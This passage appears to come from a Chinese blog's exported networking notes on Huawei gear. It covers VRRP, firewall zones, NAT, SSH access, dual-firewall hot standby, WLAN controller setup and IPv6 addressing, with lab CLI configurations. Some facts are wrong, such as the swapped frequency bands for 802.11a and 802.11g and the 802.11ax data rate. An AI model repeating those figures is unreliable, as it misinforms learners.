100.1.1.2: bytes=32 seq=2 ttl=125 time=125 msFrom 100.1.1.2: bytes=32 seq=3 ttl=125 time=125 msFrom 100.1.1.2: bytes=32 seq=4 ttl=125 time=141 msFrom 100.1.1.2: bytes=32 seq=5 ttl=125 time=141 ms--- 100.1.1.2 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 125/131/141 msPC&gt;tracert 100.1.1.2traceroute to 100.1.1.2, 8 hops max(ICMP), press Ctrl+C to stop 1 10.1.1.1 31 ms 47 ms 47 ms 2 21.1.1.2 62 ms 63 ms 62 ms 3 12.1.1.1 109 ms 110 ms 94 ms 4 100.1.1.2 93 ms 110 ms 109 ms"},{"title":"","date":"2024-03-12T03:00:00.000Z","updated":"2024-03-12T03:00:00.000Z","comments":true,"path":"notes/datacom/26.html","permalink":"https://blog.mhuig.top/notes/datacom/26","excerpt":"","text":"VRRP VRRP VRRPVRRP: 虚拟路由冗余协议. 是一个用于实现网关冗余的协议. 网关 (gateway):在一个网络内数据包的出口设备. 网络层 VRRP 工作原理将多个网关设备组成一个 VRRP 组, 在一个组内维护一台虚拟路由器, 这台虚拟路由器具有独立的 IP 地址和 MAC 地址, 用于虚拟路由的 IP 地址作为网关地址. 组内会选举出一台物理设备作为 MASTER 设备, MASTER 是虚拟路由器转发数据的真实设备. 用户的流量实际上是由 MASTER 来进行转发, 组内其他设备称为 BAKCUP 设备, BACKUP 设备会监听 MASTER 状态, 检测到 MASTER 失效会成为新的 MASTER 设备, 并接替其工作. VRRP 基本概念1.VRRP 组号: 一个 VRRP 组通过组号来进行区分, 组号的取值范围 1-255. 2.VRRP 虚拟 IP:VRRP 组的虚拟路由器的 IP 地址. 实际上是由 MASTER 设备来进行维护的. 3.VRRP 虚拟 MAC: 是虚拟路由器的 MAC 地址, 其 MAC 地址与 VRID 相关. 0000-5e00-01XX 其中最后一个字节是该虚拟路由器的 VRID. 4.VRRP 优先级: VRRP 设备通过优先级数值来选举 MASTER 设备, 优先级数值越高越优先, 优先级范围为 0-255, 但用户可以配置的范围 1-254. 缺省值为 100. 优先级 0 表示设备主动放弃 MASTER 角色. 优先级 255 表示该设备为 IP 地址拥有者. 即该设备接口的 IP 地址与虚拟地址一致. 此时无论接口优先级配置成多少, 在报文中均显示为 255. [R1-GigabitEthernet0/0/1]vrrp vrid 1 virtual-ip 10.1.1.254[R1-GigabitEthernet0/0/1]vrrp vrid 1 priority 120display vrrp brief display vrrp VRRP 状态机Master: 是 master 设备最终的稳定状态, 处于 MASTER 状态的设备, MASTER 设备会通过虚拟 MAC 地址来响应虚拟 IP 地址的 ARP 请求, 会转发用户数据, 会周期性发送 VRRP 通告报文. Backup: 是 backup 设备最终稳定的状态, 处于 backup 状态的设备, 会监听 MASTER 发出的 VRRP 通告报文, 不会响应虚拟 IP 地址的 ARP 请求, 也不会为用户转发数据. Initialize: 是 VRRP 设备初始化的状态, 当接口刚运行 VRRP 时会处于该状态, 如果接口状态为 down, 则会持续处于该状态. 当一个设备配置了 VRRP 协议后, 接口处于 Initialize 状态, 此时如果接口的优先级为 255 (即该设备为 IP 地址拥有者),此时直接从 Initialize 进入 MASTER 状态, 如果优先级非 255, 则先进入 backup 状态. 处于 backup 状态的设备会启动一个 master_down 定时器, 当定时器超时后会转变为 master 状态. 当设备从 master 状态或 backup 状态检测到接口变为 down, 则进入 initialize 状态. 如果一台设备处于 master 状态, 且收到一个更优的 VRRP 通告报文, 则由 master 状态变为 backup 状态 MASTER_DOWN 计时器MASTER_DOWN 计时器 = 3 * 通告时间 + skew_time Skew_time=(256 - 接口优先级)/256 优先级数值越大的设备越先超时, 先进入 MASTER 状态, 进入后会在网络中发送 VRRP 通告报文, backup 设备收到通告报文后会刷新自己的 MASTER_DOWN 计时器, 从而持续维护 backup 状态. 当 MASTER 失效后, 不再 VRRP 报文, 此时优先级最高的 backup 设备计时器会先超时, 成为新的 MASTER 设备. 如果 backup 设备收到一个优先级为 0 的报文, backup 设备等待 skew_time 后进入 MASTER 状态. 通告时间 默认 1s 接口优先级 大 =&gt;MASTER_DOWN 小 =&gt; 优先超时 =&gt; 优先变成 MASTER VRRP 报文VRRP 协议只有一种报文, 称为 VRRP 通告报文, 只有 MASTER 设备会发出该报文, MASTER 通过组播的方式发送 VRRP 报文 组播地址为 224.0.0.18 VRRP 基于 IP 工作, 协议号为 112 由于 backup 设备不通告报文, 所以 MASTER 设备并不知道 backup 设备的信息, 其他 backup 设备也相互不知道对方的信息. trackTrack: 在 VRRP 中可以通过 track 来检测上行链路或业务, 将 track 与 VRRP 优先级进行关联, 如果上行业务失效, 则通过降低优先级的方式来切换 master 角色. [R1-GigabitEthernet0/0/1]vrrp vrid 1 track interface GigabitEthernet0/0/0 reduced 20 VRRP 抢占延迟VRRP 抢占延迟: VRRP 协议默认开启抢占功能, master 在故障恢复后会立刻尝试抢占角色, 如果此时上行链路的路由并未收敛, 可能会导致用户的流量中断, 此时可以开启抢占延迟等待足等长的时间让上行链路收敛, 确保路由表正常后再去抢占确保用户业务不被中断. [R1-GigabitEthernet0/0/1]vrrp vrid 1 preempt-mode timer delay 45 // 设置抢占时间 VRRP 负载均衡VRRP 负载均衡: 在 VRRP 中构建多个虚拟组, 每个虚拟组都以不同的路由器作为 MASTER, 下行的业务以不同的虚拟 IP 地址作为网关, 从而可以实现让多个网关设备同时为用户转发数据当某个网关故障时, 其他的设备会接替它的 MASTER 角色, 从而实现网关冗余. [R1-GigabitEthernet0/0/1]interface GigabitEthernet0/0/1 ip address 10.1.1.1 255.255.255.0 vrrp vrid 1 virtual-ip 10.1.1.254 vrrp vrid 1 priority 110 vrrp vrid 2 virtual-ip 10.1.1.253 vrrp vrid 2 priority 105[R2-GigabitEthernet0/0/1]interface GigabitEthernet0/0/1 ip address 10.1.1.2 255.255.255.0 vrrp vrid 1 virtual-ip 10.1.1.254 vrrp vrid 1 priority 105 vrrp vrid 2 virtual-ip 10.1.1.253 vrrp vrid 2 priority 110 VRRP-BFD[R1]bfdbfd R1_TO_R3 bind peer-ip 13.1.1.3 discriminator local 1 discriminator remote 3 commit[R1-GigabitEthernet0/0/1]vrrp vrid 1 track bfd-session 1 reduced 10"},{"title":"","date":"2024-03-13T03:00:00.000Z","updated":"2024-03-13T03:00:00.000Z","comments":true,"path":"notes/datacom/27.html","permalink":"https://blog.mhuig.top/notes/datacom/27","excerpt":"","text":"防火墙 防火墙 默认 PasswordUsername : admin Password : Admin@123 Username:adminPassword:Admin@123The password needs to be changed. Change now? [Y/N]: YPlease enter old password: Admin@123Please enter new password: huawei@123Please confirm new password: huawei@123 防火墙防火墙: 可以在不同区域之间对流量进行过滤以及隔离, 从而防止一个区域的威胁进入另一个区域, 这里边的火主要指的是网络攻击和入侵, 所以一般防火墙部署在网络的边界. 路由器和交换机的本质是转发, 而防火墙的本质是控制. 防火墙的分类包过滤防火墙: 是最早的防火墙, 通过使用 ACL 实现对流量简单的控制. 主要对经过的每一个数据包进行检查. 缺点: 1. 无法关联数据包之间的关系 2. 无法适应多通道协议 3. 通常不检测应用层数据. 代理防火墙: 在应用层代理内部网络和外部网络之间的通信, 安全性较高, 但处理速度较慢, 需要对每种应用单独开发对应服务, 因此只能对少量的服务提供代理支持. 缺点: 1. 处理效率较慢 2. 软件升级较为困难. 需要针对每一种应用开发. 状态检测防火墙: 通过动态分析报文的状态决定对报文采取的动作, 不需要为每个应用程序都进行代理, 处理速度更快且安全性较高. NGFW: 下一代防火墙, 增加了很多高级特性以及自动化分析功能, 结合 AI 和大数据自动对网络攻击进行阻断. 防火墙的特征逻辑区域的过滤器 隐藏内部网络结构 自身安全保障 主动防御攻击 目前网络防火墙在网络部署中的特点包括: 集中发放安全策略 安全功能复杂多样 需要专业的管理人员进行维护 安全隐患小 防火墙的组网方式1. 二层模式 (传输模式):防火墙只进行报文转发, 不进行路由寻址, 防火墙的接口工作于同一个 IP 子网, 防火墙本身接口无需配置 IP 地址. 不影响原来的网络结构. 2. 三层模式 (路由模式):防火墙的上下接口均配置 IP 地址, 上下的业务分别在不同的 IP 子网中, 这种组网方式可以让防火墙实现更多的安全特性, 但会改变原有的网络拓扑结构. 防火墙的安全区域防火墙的安全区域 (security zone) 或简称为 zone. 区域是一个本地的逻辑概念, 同属于一个区域的设备具备相同的安全策略属性. 区域是一个或多个接口的集合. 区域的作用: 1. 防火墙的安全策略都是基于区域来进行部署. 2. 在同一个区域内发生的数据流动是不存在安全风所以不需要实施安全策略. 3. 不同区域之间的数据流动会触发安全策略, 并按照对应的策略所执行. 4. 同一个接口只能属于一个区域, 而一个安全区域可有多个接口. 华为防火墙默认区域: 1.untrust 区域: 非信任区域, 一般用于连接安全级别较低的网络, 例如企业外部网络或 internet. 优先级为 5. 2.trust 区域: 信任区域, 一般是企业可控的网络设备可以将企业内部网络规划在内部区域. 优先级为 80. 3.DMZ 区域: 非军事化区域, 一般用于部署服务器网络, 将对外提供的服务放置在 DMZ 区域, 从而可以让外部用户访问. 优先级为 50. 4.Local 区域: 表示防火墙接口自身, 所有最终终结在防火墙的流量均认为是访问 local 区域的. 优先级为 100. 防火墙的接口必须划入到区域后才可以正常工作. 每个区域存在着一个区域优先级, 优先级数值越大表示区域越可信. 默认区域的优先级不可以更改. 任意两个区域的优先级不能相同. 防火墙默认两个区域之间的流量是 deny 的, 如果需要某些流量通过, 必须在安全策略中方向对应的流量. 实验 - 二层[FW1]display zone interface GigabitEthernet1/0/0 ip address 10.1.1.1 255.255.255.0interface GigabitEthernet1/0/1 ip address 20.1.1.1 255.255.255.0firewall zone trust add interface GigabitEthernet1/0/0firewall zone untrust add interface GigabitEthernet1/0/1security-policy rule name PC3_TO_PC4 source-zone trust destination-zone untrust source-address 10.1.1.0 mask 255.255.255.0 destination-address 20.1.1.0 mask 255.255.255.0 service icmp action permit会话表[FW1]display firewall session table 防火墙放行ping (local)[FW1-GigabitEthernet1/0/0]service-manage ping permit 实验 - 三层vlan 10interface GigabitEthernet1/0/0 portswitch port link-type access port default vlan 10interface GigabitEthernet1/0/1 portswitch port link-type access port default vlan 10firewall zone trust add interface GigabitEthernet1/0/0firewall zone untrust add interface GigabitEthernet1/0/1security-policy rule name PC1_TO_PC2 source-zone trust destination-zone untrust source-address 10.1.1.0 mask 255.255.255.0 destination-address 20.1.1.0 mask 255.255.255.0 service icmp action permit NATNAT: 可以通过在防火墙配置 NAT, 实现私网设备访问公网地址, 由于防火墙一般位于企业的边界网络, 所以 NAT 的配置也是防火墙需要掌握的基本配置之一. 1, 交换机作为 VLAN 10 与 VLAN 20 的网关, 实现两个 VLAN 内网互通. 2, 交换机与防火墙之间使用三层互联, 交换机互联 vlan 为 vlan30. sw1: 10.1.30.1/24 FW:10.1.30.2/24 防火墙作为服务器网关,配置IP地址 192.168.1.1/24 防火墙与路由器之间配置IP地址 R1:100.1.1.1/24 FW:100.1.1.2/24 路由器作为client的网关,配置IP地址200.1.1.1/24 交换机配置静态缺省路由,网关指向防火墙 3, 将防火墙的接口划入到对应区域中, 防火墙配置2条到内网的路由以及一条缺省路由 ip route-static 0.0.0.0 0.0.0.0 100.1.1.1ip route-static 10.1.10.0 255.255.255.0 10.1.30.1ip route-static 10.1.20.0 255.255.255.0 10.1.30.1 4, 防火墙上配置策略以及 NAT 实现: PC能够访问互联网中的设备 security-policy rule name PC_TO_INTERNET source-zone trust destination-zone untrust source-address 10.1.10.0 mask 255.255.255.0 source-address 10.1.20.0 mask 255.255.255.0 action permitnat-policy rule name PC_EASY_IP source-zone trust destination-zone untrust source-address 10.1.10.0 mask 255.255.255.0 source-address 10.1.20.0 mask 255.255.255.0 action source-nat easy-ip nat-policy rule name HTTP source-zone untrust destination-address 100.1.1.2 mask 255.255.255.255 service protocol tcp destination-port 8080 action destination-nat static port-to-port address 192.168.1.100 80security-policy rule name HTTP source-zone untrust destination-zone dmz destination-address 192.168.1.100 mask 255.255.255.255 action permit WEBUIinterface GigabitEthernet0/0/0 ip address 10.10.10.2 255.255.255.0 service-manage http permit service-manage https permit service-manage ping permithttps://10.10.10.2:8443 SSH1.创建用于登陆的SSH用户,并将SSH用户进行角色关联[FW1]aaa[FW1-aaa]manager-user sshadmin [FW1-aaa-manager-user-sshadmin]password cipher huawei@123[FW1-aaa-manager-user-sshadmin]service-type ssh[FW1-aaa-manager-user-sshadmin]level 15[FW1-aaa]bind manager-user sshadmin role system-admin 2.启用SSH服务,并在接口下放行SSH[FW1]int g0/0/0[FW1-GigabitEthernet0/0/0]service-manage ssh permit [FW1]stelnet server enable 3.设置vty线路[FW1]user-interface vty 0 4[FW1-ui-vty0-4]protocol inbound ssh [FW1-ui-vty0-4]authentication-mode aaa4.指定用户的登录方式[FW1]ssh user sshadmin[FW1]ssh user sshadmin authentication-type password[FW1]ssh user sshadmin service-type stelnet 5.生成RSA密钥对.[FW1]rsa local-key-pair create The key name will be: FW1_HostThe range of public key size is (2048 ~ 2048). NOTES: If the key modulus is greater than 512, it will take a few minutes.Input the bits in the modulus[default = 2048]:Generating keys......+++++........................++....++++...........++命令行c:\\&gt;ssh sshadmin@10.10.10.2The authenticity of host '10.10.10.2 (10.10.10.2)' can't be established.ECDSA key fingerprint is SHA256:onA2uyf3daCaGnH9UsZUWjQc1FrYeSNNXBc+Bb4oiLk.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.10.2' (ECDSA) to the list of known hosts.User AuthenticationPassword:************************************************************************** Copyright (C) 2014-2018 Huawei Technologies Co., Ltd. ** All rights reserved. ** Without the owner's prior written consent, ** no decompiling or reverse-engineering shall be allowed. **************************************************************************Info: The max number of VTY users is 10, and the number of current VTY users on line is 1. The current login time is 2024-03-14 03:02:59+00:00.&lt;FW1&gt;syEnter system view, return user view with Ctrl+Z.[FW1] 防火墙双机热备通常情况下防火墙部署在网络的出口, 如果防火墙出现故障, 可能会导致内网的数据无法转发, 此时需要通过部署, 可能会导致内网的数据无法转发, 此时需要通过部署 2 台防火墙形成双机热备. 双机热备条件1. 组成双机热备的防火墙必须是相同型号的. 且安装相同的单板, 单板的数量与位置必须相同. 2. 两台防火墙必须具有相同的系统版本以及系统补丁, 组件包与特征库等信息也必须相同. 心跳线心跳线: 心跳线是两台防火墙交互信息了解对端状态以及备份配置命令和各种表项的通道心跳线两端的接口一般也被称为 \"心跳接口\". 心跳线中传递的信息: 1. 心跳报文 (helo 报文): 2 台防火墙定期 (默认为 1s) 交互的报文, 用于检测对端是否存活. 2.VGMP 报文: 了解对端设备 VGMP 组的状态, 确定本端和对端设备当前状态是否稳定, 是否需要进行故障切换. 3. 配置和表项备份报文: 用于两台防火墙同步配置以及状态. 4. 心跳链路探测报文: 用于检测对端设备的心跳接口是否正常接收本端设备的报文, 确定是否心跳接口可以使用. 5. 配置一致性检查报文: 用于检测两台防火墙的关键配置是否一致 (如安全策略、NAT 策略). 双机热备的工作模式1. 主备模式: 流量由单台设备处理, 路由规划和故障定位相对简单. 2. 负载分担模式: 相对于主备模式配置复杂, 需要考虑来回路径一致性, 所有的用户流量由两台防火墙同时处理, 可以承载更大的峰值流量. [FW1]firewall zone name HA[FW1-zone-HA]set priority 90[FW1-zone-HA]add interface g1/0/2[FW2]hrp interface g1/0/2 remote 100.1.1.1[FW1]hrp interface g1/0/2 remote 100.1.1.2HRP_M[FW1-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 20.1.1.254 active HRP_S[FW2-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 20.1.1.254 standby HRP_M[FW1-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 10.1.1.254 activeHRP_S[FW2-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 10.1.1.254 standby HRP_M[FW1-policy-security]security-policy rule name PC_TO_R1 source-zone trust destination-zone untrust source-address 10.1.1.0 mask 255.255.255.0 destination-address 1.1.1.1 mask 255.255.255.255 action permit displayHRP_M[FW1]hrp switch active HRP_M[FW1]display hrp configuration check zone Info: You must run the check command to view the result. Module State Start-time End-time Result zone init HRP_M[FW1]display hrp configuration check all Info: You must run the check command to view the result. Module State Start-time End-time Result all init HRP_M[FW1]display hrp state Role: active, peer: standby (\"hrp switch active\" on this device) Running priority: 45001, peer: 45000 Backup channel usage: 0.00% Stable time: 0 days, 0 hours, 0 minutes Last state change information: 2024-03-14 8:05:36 HRP core state changed, old_state = abnormal(standby), new_state = abnormal(active), local_priority = 45001, peer_priority = 45000.HRP_M[FW1]display hrp interface GigabitEthernet1/0/2 : running----会话表是同步的HRP_M[FW1]dis firewall session table Current Total Sessions : 3 udp VPN: public --&gt; public 100.1.1.2:16384 --&gt; 100.1.1.1:18514 udp VPN: public --&gt; public 100.1.1.2:49152 --&gt; 100.1.1.1:18514 udp VPN: public --&gt; public 100.1.1.1:49152 --&gt; 100.1.1.2:18514HRP_M[FW1]dis firewall session table Current Total Sessions : 3 udp VPN: public --&gt; public 100.1.1.2:16384 --&gt; 100.1.1.1:18514 udp VPN: public --&gt; public 100.1.1.2:49152 --&gt; 100.1.1.1:18514 udp VPN: public --&gt; public 100.1.1.1:49152 --&gt; 100.1.1.2:18514-----HRP_M[FW1]display hrp ? configuration Check local configuration with remote firewall history-information Indicate HRP history information interface Indicate HRP backup channels infomation state Indicate the HRP status infomation statistic Indicate HRP statistic information 心跳线的冗余心跳线的冗余: 为了防止心跳线出现单点故障, 可以在防火墙之间连接多跟心跳线, 通过链路聚合的方式来实现链路冗余. HRP_M[FW1]interface Eth-Trunk 1HRP_M[FW1-Eth-Trunk1]trunkport GigabitEthernet 1/0/2 to 1/0/3HRP_M[FW1-Eth-Trunk1]mode lacp-staticHRP_M[FW1-Eth-Trunk1]ip add 100.1.1.1 24HRP_M[FW1]firewall zone HA HRP_M[FW1-zone-HA]add interface Eth-Trunk 1HRP_M[FW1]hrp interface Eth-Trunk 1 remote 100.1.1.2"},{"title":"","date":"2024-03-19T03:00:00.000Z","updated":"2024-03-19T03:00:00.000Z","comments":true,"path":"notes/datacom/28.html","permalink":"https://blog.mhuig.top/notes/datacom/28","excerpt":"","text":"WLAN WLAN WLANWLAN: 无线局域网, 指的是无线技术构建的无线网络, 通过 WLAN 技术可以让用户随时随地的接入网络, 并且在 WLAN 覆盖的区域内实现自由移动, 摆脱有线网络的束缚. 广义上指的是, 无线电波, 激光, 红外线等无线信号来代替网络中部分或全部传输介质构成的网络. WLAN 的优点网络使用自由: 凡是自由空间均可以连接网络, 不受限于线缆和端口的位置. 网络部署灵活: 对于地铁, 公共交通监控等难以布线的场所. 采用 WLAN 进行无线网络覆盖, 免去了复杂的网络布线, 实施简单, 成本低, 扩展性好. IEEE802.11 Wi-Fi制定无线技术 (Wi-Fi) 的标准为 IEEE802.11, 是目前无线局域网内最广泛的技术. IEEE802.11 的标准和 Wi-Fi 的历史 IEEE802.11 第一个版本发表于 1997 年, 此后更多基于 IEEE802.11 的补充标准逐渐被定义. 标准类型: 802.11b,802.11a,802.11g,802.11n,802.11ac,802.11ax. 1997 年基于 IEEE802.11 使用的是 WIFI 1 (第一代),频率 2.4GHZ, 传输速率为 2Mbit / s. 1999 年基于 802.11b 使用的是 WIFI 2 (第二代),频率 2.4GHZ, 传输速率为 11Mbit / s. 2003 年基于 802.11a 和 802.11g 使用的是 WIFI 3, 传输速率为 54Mbit / s. 802.11a主要工作于2.4GHZ 802.11g主要工作于5GHZ 2009 年基于 802.11n 使用的是 WIFI 4, 可以工作于 2.4GHZ 和 5GHZ, 传输速率为 300Mbit / s. 2013 年基于 802.11ac wave1 使用的是 WIFI 5 技术, 工作于 5GHZ, 传输速率为 1300Mbit / s. 2015 年基于 802.11ac wave2 使用的是 WIFI 5 技术, 工作于 5GHZ, 传输速率为 6.9Gbit / s. 2018 年基于 802.11ax 使用的是 WIFI 6 技术, 工作于 5GHZ, 传输速率为 6.9Gbit / s. 无线组网的三大组件AP: 无线接入点 AC: 无线控制器 PoE 交换机: 通过以太网线为网络设备 (AP, 网络摄像头, IP 电话等等) 进行供电. WLAN 基本概念射频信号: 提供基于 802.11 标准的 WLAN 技术的传输介质, 是具有远距离传输能力的高频电磁波 STA: 工作站, 支持无线的工作设备 VAP: 虚拟接入点, 一个 VAP 就是一个无线业务, 一个 AP 可以提供多个 VAP, 多个 AP 也可以提供一个 VAP 功能 WLAN 的组网方式二层组网: 瘦 AP 和 AC 之间采用直连或者二层网络进行连接组网方式比较简单, 适用于临时组网. 三层组网: 瘦 AP 和 AC 之间为三层网络, AP 和 AC 不在同一个子网或同一个广播域中, 需要路由器或三层交换机进行数据转发. 在实际组网中, 一台 AC 可以连接几十台甚至上百台 AP,AP 布置在办公室等场所, AC 布置在机房, 因此大型的组网中一般采用三层组网. AC 的连接方式直连式组网: AC 在网络中充当着交换机的角色, AC 下游直接连接 AP, 所有的数据必须经过 AC 到达上层网络. 优点: 组网结构清晰, 组网实施简单 缺点: 整个网络的传输能力决定于 AC 性能 旁挂式组网: AC 旁挂在 AP 上行网络的直连链路上, AP 的业务可以不通过 AC 转发到网关. 优点: 易于网络扩展 缺点: 部署实施起来相对复杂 capwap无线接入点控制和配置协议, 是一个基于 UDP 的应用层协议, 即 AC 通过 capwap 隧道实现 AP 的集中管理和控制. 端口: 5246: 管理流量端口 5247: 业务数据流量端口 无线网络中的数据转发模式直接转发: 业务流量到达 AP 后将数据转发给汇聚交换机, 不需要 AC 来进行处理. 隧道转发: AP 和 AC 之间建立一个 capwap 虚拟隧道, 所有的无线的业务流量需要通过隧道到达 AC, 由 AC 转发给交换机. shell[AC6005]wlan[AC6005-wlan-view]regulatory-domain-profile name regpro[AC6005-wlan-regulate-domain-regpro]country-code CN //国家代码[AC6005]capwap source interface Vlanif 20[AC6005]wlan [AC6005-wlan-view]ap-group name apgp1 //AP组[AC6005-wlan-ap-group-apgp1]regulatory-domain-profile regpro //关联配置Warning: Modifying the country code will clear channel, power and antenna gain configurations of the radio and reset the AP. Continue?[Y/N]:y[AC6005-wlan-view]ap auth-mode mac-auth [AC6005-wlan-view]ap-id 1 ap-mac 00e0-fc3e-2980[AC6005-wlan-ap-1]ap-name AP1[AC6005-wlan-ap-1]ap-group apgp1Warning: This operation may cause AP reset. If the country code changes, it will clear channel, power and antenna gain configurations of the radio, Whether to continue? [Y/N]:yInfo: This operation may take a few seconds. Please wait for a moment.. done.[AC6005-wlan-view]ap-id 2 ap-mac 00e0-fcc4-0ca0[AC6005-wlan-ap-2]ap-name AP2[AC6005-wlan-ap-2]ap-group apgp1Warning: This operation may cause AP reset. If the country code changes, it will clear channel, power and antenna gain configurations of the radio, Whether to continue? [Y/N]:yInfo: This operation may take a few seconds. Please wait for a moment.. done.[AC6005-wlan-view]dis ap allInfo: This operation may take a few seconds. Please wait for a moment.done.Total AP information:nor : normal [2]-------------------------------------------------------------------------------------ID MAC Name Group IP Type State STA Uptime-------------------------------------------------------------------------------------1 00e0-fc3e-2980 AP1 apgp1 20.1.1.184 AP2050DN nor 0 2M:31S2 00e0-fcc4-0ca0 AP2 apgp1 20.1.1.60 AP2050DN nor 0 7S-------------------------------------------------------------------------------------Total: 2[AC6005-wlan-view]ssid-profile name ssidpro[AC6005-wlan-ssid-prof-ssidpro]ssid huaweiInfo: This operation may take a few seconds, please wait.done.[AC6005-wlan-view]security-profile name secpro[AC6005-wlan-sec-prof-secpro]security ? open Open system wapi WLAN authentication and privacy infrastructure wep Wired equivalent privacy wpa Wi-Fi protected access wpa-wpa2 Wi-Fi protected access version 1&amp;2 wpa2 Wi-Fi protected access version 2 [AC6005-wlan-sec-prof-secpro]security wpa-wpa2 psk pass-phrase huawei123 aes[AC6005-wlan-view]vap-profile name vappro[AC6005-wlan-vap-prof-vappro]ssid-profile ssidproInfo: This operation may take a few seconds, please wait.done.[AC6005-wlan-vap-prof-vappro]security-profile secproInfo: This operation may take a few seconds, please wait.done.[AC6005-wlan-vap-prof-vappro]forward-mode tunnel [AC6005-wlan-vap-prof-vappro]service-vlan vlan-id 10Info: This operation may take a few seconds, please wait.done.[AC6005-wlan-view]ap-group name apgp1 [AC6005-wlan-ap-group-apgp1]vap-profile vappro wlan 1 radio 0"},{"title":"","date":"2024-04-07T03:00:00.000Z","updated":"2024-04-07T03:00:00.000Z","comments":true,"path":"notes/datacom/29.html","permalink":"https://blog.mhuig.top/notes/datacom/29","excerpt":"","text":"IPv6 IPv6 IPv4IPv4: 互联网协议版本 4, 工作在网络层, 用于分配逻辑地址, 在网络层进行逻辑寻址 IPv4 协议的缺点: IPv4 地址枯竭. 报文头部设计不合理, 因为报文头部长度不是定长. IPv4 协议过度依赖 ARP 协议, 导致在网络中广播报文过度泛滥. 32bit 2^32=4E9 延缓 IPv4 地址枯竭的方式: NAT: 由于可以实现多个私网地址共用一个公网地址, 极大程度上延缓了 IPv4 公网地址的消耗 VLSM,CIDR,DHCP: 虽然无法增加 IPv4 地址的空间, 但是提高了 IPv4 地址的使用率 IPv6 特点近乎无限的地址空间: 从 IPv4 的 32bit 增加到了 128bit. 简化了报文头部: 现在 IPv6 报文头部是固定长度, 从而提高了设备的处理效率, 并且增加了灵活的扩展头机制, 从而提高了 IPv6 的扩展性. 即插即用: 配置 IPv6 的方式更加简单, 并且可以实现设备之间的自动配置. 增强了 QoS 特性: 增加了流标记域, 可以为应用程序或者终端所使用, 针对特殊的服务和数据流, 分配特定的资源. IPv6 地址1 个十进制数 =&gt;8bit 1 个十六进制数 =&gt;4bit IPv6 地址: 长度为 128bit, 为了方便书写, 使用十六进制进行表示, 每四个十六进制数为一段, 共分为 8 段, 并且用冒号隔开, 这种表示方法称之为 \"冒号分十六进制表示法\". IPv6 地址包括两部分: 网络前缀: 类似于 IPv4 中的网络位 接口标识: 类似于 IPv4 中的主机位 并且在使用 IPv6 地址时, 也会用 \"/xx\" 来表示该 IPv6 地址的网络前缀, 类似于子网掩码的作用. IPv6 地址缩写2001:0db8:0000:0000:0008:0800:200c:417a 第一步: 每段内如果以数字 0 开头, 则 0 可以省略. 2001:db8:0000:0000:8:800:200c:417a 第二步: 如果该段为 0000, 则可以简写成一个 0. 2001:db8:0:0:8:800:200c:417a 第三步: 如果在 IPv6 地址中出现了连续的多个 0, 则可以简写成 \"::\". 2001:db8::8:800:200c:417a 注意: \"::\",双冒号的表示方法在 IPv6 地址缩写中只能使用一次. 2001:0db8:0000:0000:0000:0008:0000:00002001:db8::8:: ????2001:0db8::8:0:00000:0000:0000:0000:0000:0000:0000:0001::12001:0DB8:0000:0000:FB00:1400:5000:45FF2001:DB8::FB00:1400:5000:45FF2001:0DB8:0000:0000:0000:2A2A:0000:00012001:DB8::2A2A:0:12001:0DB8:0000:1234:FB00:0000:5000:45FF2001:DB8::1234:FB00:0:5000:45FF2001:DB8:0:1234:FB00::5000:45FF IPv6 地址分类IPv6 地址的分类: IPv6 中没有广播地址 单播地址: 表示配置的设备接口的 IPv6 地址, 用于指导报文发往某一设备. 组播地址: 表示一组 IPv6 设备, 用于 IPv6 的组播通信. 任播地址: 表示具备相同服务的设备, 该组设备可以配置相同的任播地址, 任播地址采用和单播地址相同的地址空间. 并且任播地址只能作为目的地址使用, 不能作为源地址使用. IPv6 的单播地址全球单播地址: 全球范围唯一, 类似于 IPv4 中的公网地址, 可以用于 IPv6 的互联网所使用. 前 3bit 固定为 001 开头, 2000::/3 0x0010=2 0x0011=3 45bit 全局路由前缀: 是由运营商进行分配. 16bit 的子网 ID: 用于企业内部分配子网. 唯一本地地址: 是 IPv6 中的私网地址, 只能够在内网中使用, 该地址不可以被公网路由, 因此不能直接访问公网. 前 8bit 固定为 1111 1101, FD00::/8 40bit 的全局 ID: 通过伪随机数产生, 虽然是通过随机产生, 但是冲突概率很低. 16bit 的子网 ID: 用于企业内部分配子网. 链路本地地址: 在 IPv4 中没有对应的概念, 是一种应用范围受限制的地址类型, 链路本地地址只在本地链路内生效, 源或者目的为链路本地地址的数据不会被转发到另一条链路上, 一般用于基于 IPv6 工作的协议使用的, 例如, IPv6 的邻居发现, IPv6 地址无状态自动配置等 前 10bit 固定为 1111 1110 10, FE80::/10 54bit 固定为 0 实验 - IPv6 静态路由1. 使能 IPv6 功能 系统视图下 [R1]ipv6 2. 在接口下使能 IPv6 功能 interface GigabitEthernet0/0/0 ipv6 enable ipv6 address 2001::1/64 查看 IPv6 路由表 display ipv6 routing-table 查看接口的 IPv6 协议摘要信息 (查看接口的 IPv6 地址) display ipv6 interface brief 3. 配置静态路由实现全网互通 [R1]ipv6 route-static 2002:: 64 2001::2[R3]ipv6 route-static 2001:: 64 2002::1 4. 进行连通性测试 [R1]ping ipv6 2002::2 链路本地地址的自动生成方式:采用 EUI-64 算法生成, EUI-64 算法根据设备的唯一硬件地址 (MAC 地址),生成全球唯一的 64bit 的接口 ID, 从而配置网络前缀得到一个唯一的链路本地地址. 计算规则: 1. 将 MAC 地址从最中间隔开, 插入 FFFE. 2. 将 MAC 地址的第 7bit 进行反转. 00e0-fcf0-1886 1. 插入 FFFE 00e0-fcff-fef0-1886 2. 第 7bit 进行反转 0 0 e 00000 0000 e 00000 0010 e 0 0 2 e 0 3.FE80::前缀 FE80::02e0:fcff:fef0:1886 实验 - 链路本地地址interface GigabitEthernet0/0/0 ipv6 enable ipv6 address auto link-local[R1]display ipv6 interface brief*down: administratively down(l): loopback(s): spoofingInterface Physical Protocol GigabitEthernet0/0/0 up up [IPv6 Address] FE80::2E0:FCFF:FE98:3F54[R1]ipv6 route-static :: 0 GigabitEthernet 0/0/0[R1]ping ipv6 FE80::2E0:FCFF:FE24:6CBA -i GigabitEthernet 0/0/0[R1]ping ipv6 FE80::2E0:FCFF:FE24:6CBB -i GigabitEthernet 